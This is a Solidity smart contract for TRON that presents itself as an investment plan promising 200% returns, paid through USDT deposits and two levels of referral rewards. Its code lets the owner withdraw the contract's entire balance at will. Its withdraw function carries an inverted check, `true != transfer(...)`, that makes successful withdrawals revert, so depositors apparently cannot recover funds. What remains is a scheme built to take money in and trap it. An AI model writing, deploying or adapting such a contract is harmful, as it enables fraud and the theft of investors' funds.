pragma solidity ^0.5.15;

import "./SafeMath.sol";

contract TRC20_Interface {

    function allowance(address _owner, address _spender) public view returns (uint remaining);

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function transfer(address direccion, uint cantidad) public returns (bool);

    function balanceOf(address who) public view returns (uint256);
}

contract InvestAndMultipply2021 {
  using SafeMath for uint;

  TRC20_Interface USDT_Contract;

  TRC20_Interface OTRO_Contract;

  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    bool recompensa;
    address sponsor;
    Referer[] referers;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }

  uint public MIN_DEPOSIT = 10 trx;
  uint public MIN_RETIRO = 10 trx;

  uint public RETIRO_DIARIO = 100000 trx;
  
  address payable public marketing;
  address payable public owner;
  address public NoValido = address(0);

  uint[2] public porcientos = [2, 3];

  uint[10] public tiempo = [ 200 days, 133 days, 100 days, 80 days, 66 days, 57 days, 50 days, 44 days, 40 days, 33 days];
  uint[10] public porcent = [ 200, 200, 200, 200, 200,  200, 200, 200, 200, 200];

  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;


  mapping (address => Investor) public investors;

  constructor(address _tokenTRC20, address payable _marketing) public {
    USDT_Contract = TRC20_Interface(_tokenTRC20);
    marketing = _marketing;
    owner = msg.sender;
    investors[msg.sender].registered = true;
    investors[msg.sender].sponsor = marketing;

    totalInvestors++;

  }

  function ChangeTokenUSDT(address _tokenTRC20) public returns (bool){

    require( msg.sender == owner );

    USDT_Contract = TRC20_Interface(_tokenTRC20);

    return true;

  }

  function ChangeTokenOTRO(address _tokenTRC20) public returns (bool){

    require( msg.sender == owner );

    OTRO_Contract = TRC20_Interface(_tokenTRC20);

    return true;

  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }

  function InContractUSDT() public view returns (uint){
    return USDT_Contract.balanceOf(address(this));
  }

  function InContractOTRO() public view returns (uint){
    return OTRO_Contract.balanceOf(address(this));
  }

  function setTarifa(uint _value) internal pure returns(uint){

    uint tariff;
      if( _value <= 100 trx ){
          tariff = 0;
      }

      if( _value > 100 trx && _value <= 500 trx ){
          tariff = 1;
      }

      if( _value > 500 trx && _value <= 1000 trx ){
          tariff = 2;
      }

      if( _value > 1000 trx && _value <= 3000 trx ){
          tariff = 3;
      }

      if( _value > 3000 trx && _value <= 5000 trx ){
          tariff = 4;
      }

      if( _value > 5000 trx && _value <= 10000 trx ){
          tariff = 5;
      }

      if( _value > 10000 trx && _value <= 20000 trx ){
          tariff = 6;
      }

      if( _value > 20000 trx && _value <= 30000 trx ){
          tariff = 7;
      }

      if( _value > 30000 trx && _value <= 50000 trx ){
          tariff = 8;
      }

      if( _value > 50000 trx ){
          tariff = 9;
      }

      return tariff;

  }

  function setmarketing(address payable _marketing) public returns (address){
    require (msg.sender == marketing, "You are not marketing");
    require (_marketing != marketing, "You are already registered");

    marketing = _marketing;
    investors[marketing].registered = true;
    investors[marketing].sponsor = marketing;

    totalInvestors++;

    return marketing;
  }


  function column (address yo) public view returns(address[2] memory res) {

    res[0] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[1] = investors[yo].sponsor;
    yo = investors[yo].sponsor;

    return res;
  }

  function rewardReferers(address yo, uint amount) internal {

    address[2] memory referi = column(yo);
    uint[2] memory a;
    uint[2] memory b;

    for (uint i = 0; i < 2; i++) {
      if (investors[referi[i]].registered && referi[i] != address(0)) {

        if ( investors[referi[i]].recompensa ){
          b[i] = porcientos[i];
          a[i] = amount.mul(b[i]).div(100);

          investors[referi[i]].balanceRef += a[i];
          investors[referi[i]].totalRef += a[i];
          totalRefRewards += a[i];
        }

      }else{
        break;
      }
    }


  }

  function deposit(uint _value, address _sponsor) public {

    Investor storage usuario = investors[msg.sender];

    require( USDT_Contract.allowance(msg.sender, address(this)) >= _value, "saldo aprovado insuficiente");
    require( USDT_Contract.transferFrom(msg.sender, address(this), _value), "que saldo de donde?" );

    if (!usuario.registered){

      usuario.registered = true;
      usuario.recompensa = true;
      usuario.sponsor = _sponsor;
      totalInvestors++;
    }

    if (usuario.sponsor != address(0) ){
      rewardReferers(msg.sender, _value);
    }

    usuario.deposits.push(Deposit(setTarifa(_value.mul(90).div(100)), _value.mul(90).div(100), block.number));

    usuario.invested += _value;
    totalInvested += _value;

    USDT_Contract.transfer(owner, _value.mul(3).div(100));
    USDT_Contract.transfer(marketing,_value.mul(2).div(100));

  }


  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff].div(3);
      uint porcientD = porcent[dep.tariff];

      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }


  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff].div(3);
      uint porcientD = porcent[dep.tariff];

      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }

  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];

    uint amount = withdrawable(msg.sender);

    amount += investor.balanceRef;
    investor.balanceRef = 0;

    investor.paidAt = block.number;

    return amount;

  }


  function withdraw() external {

    Investor storage usuario = investors[msg.sender];

    uint amount = withdrawable(msg.sender);
    amount = amount+usuario.balanceRef;

    require ( USDT_Contract.balanceOf(address(this)) >= amount, "The contract has no balance");
    require ( amount >= MIN_RETIRO, "The minimum withdrawal limit reached");
    require ( RETIRO_DIARIO >= amount, "Global daily withdrawal limit reached");

    require ( true != USDT_Contract.transfer(msg.sender,amount.mul(65).div(100)), "whitdrawl Fail" );

    profit();

    usuario.deposits.push(Deposit(setTarifa(amount.mul(25).div(100)), amount.mul(25).div(100), block.number));

    usuario.invested += amount.mul(25).div(100);

    usuario.withdrawn += amount;

  }

  function redimUSDT01() public returns (uint256){
    require(msg.sender == owner);

    uint256 valor = USDT_Contract.balanceOf(address(this));

    USDT_Contract.transfer(owner, valor);

    return valor;
  }

  function redimUSDT02(uint _value) public returns (uint256) {

    require ( msg.sender == owner, "only owner");

    require ( USDT_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");

    USDT_Contract.transfer(owner, _value);

    return _value;

  }

  function redimOTRO01() public returns (uint256){
    require(msg.sender == owner);

    uint256 valor = OTRO_Contract.balanceOf(address(this));

    OTRO_Contract.transfer(owner, valor);

    return valor;
  }

  function redimOTRO02(uint _value) public returns (uint256){

    require ( msg.sender == owner, "only owner");

    require ( OTRO_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");

    OTRO_Contract.transfer(owner, _value);

    return _value;

  }

  function () external payable {}

}
